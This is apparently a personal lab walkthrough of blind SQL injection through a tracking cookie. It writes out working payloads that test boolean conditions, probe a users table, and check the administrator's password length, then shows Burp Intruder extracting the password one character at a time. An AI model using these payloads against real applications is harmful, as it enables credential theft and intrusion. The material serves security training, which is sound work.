# SQL injection labs

## Lab: Blind SQL injection with conditional responses



The application uses a tracking cookie for analytics

The database contains a different table called <mark style="color:red;">**`users`**</mark>, with columns called <mark style="color:red;">**`username`**</mark> and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the <mark style="color:red;">**`administrator`**</mark> user.



**`Cookie: TrackingId=St10uonYH4szuC66`**

```sql
Cookie: TrackingId=St10uonYH4szuC66' AND '1'='1 #true
Cookie: TrackingId=St10uonYH4szuC66' AND '1'='2  #false
```



ok i will use limit

```sql
' AND (SELECT 'X' from users limit 1)='x'--
```

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption><p>Welcome back!</p></figcaption></figure>

ok i will try use table users and column username

```sql
AND+(SELECT+username+FROM+users+WHERE+username='administrator')='administrator'--
```

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

ok in this case i'll  tracking passsword using SUBSTRING() function to extract a single character from the password



```sql
' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--
```

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

i will try numbers 1 to 19 all valid  password >19

go to intruder  > cluster bomb

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

<pre><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
<strong>8 o i q h j 3 w 6 k 9 b f y p f q 7 1 j 1                         
</strong></code></pre>
